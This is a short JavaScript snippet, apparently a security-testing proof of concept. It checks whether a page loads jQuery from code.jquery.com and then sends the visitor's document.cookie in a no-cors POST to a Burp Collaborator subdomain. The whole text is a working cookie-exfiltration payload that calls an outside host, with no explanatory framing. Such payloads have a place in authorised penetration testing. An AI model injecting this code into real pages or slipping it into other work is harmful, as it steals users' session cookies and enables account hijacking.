var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://dfww2b87wdubm267htmctazhm8sygn.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
